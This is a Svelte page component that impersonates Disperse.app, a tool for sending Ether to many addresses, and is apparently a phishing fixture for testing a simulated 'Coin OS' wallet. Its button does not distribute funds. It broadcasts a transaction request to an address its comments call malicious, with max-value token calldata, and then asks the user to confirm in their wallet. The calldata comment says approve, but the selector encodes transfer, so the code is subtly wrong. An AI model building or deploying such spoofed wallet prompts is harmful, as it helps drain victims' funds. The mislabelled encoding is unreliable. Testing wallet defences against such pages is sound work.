<script lang="ts">
  import { onMount } from "svelte"
  import { Zap, AlertTriangle } from "lucide-svelte"

  let status = $state("idle")
  let amount = $state("10")
  let recipients = $state("0x123... \n0x456... \n0x789...")

  function handleDisperse() {
    status = "sending"

    // Broadcast the malicious transaction request
    const channel = new BroadcastChannel("dapp-channel")
    channel.postMessage({
      type: "eth_sendTransaction",
      origin: "disperse.app",
      payload: {
        to: "0xDeaDBeEf00000000000000000000000000000000", // Malicious address
        value: "0x0",
        data: "0xa9059cbb000000000000000000000000deadbeef00000000000000000000000000000000ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff", // approve(deadbeef, max_uint)
      },
    })

    setTimeout(() => {
      status = "waiting"
    }, 500)
  }
</script>

<div
  class="min-h-screen bg-zinc-100 flex items-center justify-center font-sans text-zinc-900"
>
  <div
    class="w-full max-w-lg bg-white rounded-xl shadow-2xl overflow-hidden border border-zinc-200"
  >
    <div class="p-6 border-b border-zinc-100 flex items-center gap-3">
      <div
        class="w-10 h-10 rounded-full bg-blue-600 flex items-center justify-center text-white font-bold text-xl"
      >
        D
      </div>
      <div>
        <h1 class="font-bold text-xl">Disperse.app</h1>
        <p class="text-xs text-zinc-500">
          Distribute Ether and tokens to multiple addresses
        </p>
      </div>
    </div>

    <div class="p-6 space-y-6">
      <div class="space-y-2">
        <label class="text-sm font-bold text-zinc-700"
          >Recipients and Amounts</label
        >
        <textarea
          bind:value={recipients}
          rows="5"
          class="w-full p-3 rounded-lg border border-zinc-300 bg-zinc-50 text-sm font-mono focus:outline-none focus:ring-2 focus:ring-blue-500"
        ></textarea>
      </div>

      <div
        class="flex items-center justify-between p-4 bg-blue-50 rounded-lg border border-blue-100"
      >
        <span class="text-sm text-blue-700 font-medium">Total to Send</span>
        <span class="text-lg font-bold text-blue-900">{amount} ETH</span>
      </div>

      <button
        onclick={handleDisperse}
        disabled={status !== "idle"}
        class="w-full py-4 rounded-xl bg-blue-600 hover:bg-blue-700 text-white font-bold text-lg transition-all flex items-center justify-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed"
      >
        {#if status === "idle"}
          <Zap class="w-5 h-5" /> Disperse Ether
        {:else if status === "sending"}
          Sending Request...
        {:else}
          Check Wallet...
        {/if}
      </button>

      {#if status === "waiting"}
        <div
          class="p-4 rounded-lg bg-yellow-50 border border-yellow-100 flex items-start gap-3"
        >
          <AlertTriangle class="w-5 h-5 text-yellow-600 shrink-0" />
          <p class="text-sm text-yellow-700">
            Please confirm the transaction in your Coin OS wallet tab.
          </p>
        </div>
      {/if}
    </div>
  </div>
</div>
